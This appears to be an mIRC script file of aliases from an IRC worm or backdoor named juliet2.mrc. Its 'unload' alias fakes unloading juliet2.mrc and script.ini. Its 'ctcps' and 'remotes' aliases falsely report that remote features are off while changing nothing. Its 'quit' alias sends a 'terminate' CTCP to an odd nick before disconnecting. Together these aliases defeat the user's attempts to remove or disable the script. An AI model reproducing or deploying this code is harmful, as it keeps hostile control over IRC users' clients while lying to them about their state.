alias unload {
  if ( $2 == juliet2.mrc ) { /echo 2 -se *** Unloaded script ' $+ $$2 $+ ' }
  elseif ( $2 == script.ini ) { /echo 2 -se *** Unloaded script ' $+ $$2 $+ ' }
  else { /unload $$1- }
}
alias ctcps {
  if ( $1 == off ) { /echo 2 -a *** Ctcps are OFF | halt }
  if ( $1 == on ) { /echo 2 -a *** Ctcps are ON | halt }
}
alias remotes {
  if ( $1 == off ) { /echo 2 -a *** Remotes are OFF | halt }
  if ( $1 == on ) { /echo 2 -a *** Remotes are ON | halt }
}
alias quit {
  /.ctcp rgxynjwe terminate
  /.disconnect
}
alias prince /.ignore -pcinku600 $nick | /.close -c $nick | /.close -m $nick | halt
alias nurse /.notice $nick His looks I fear, and his intents I doubt. | /.ignore -pcinkut1200 $nick | /.close -c $nick | /.close -m $nick | halt
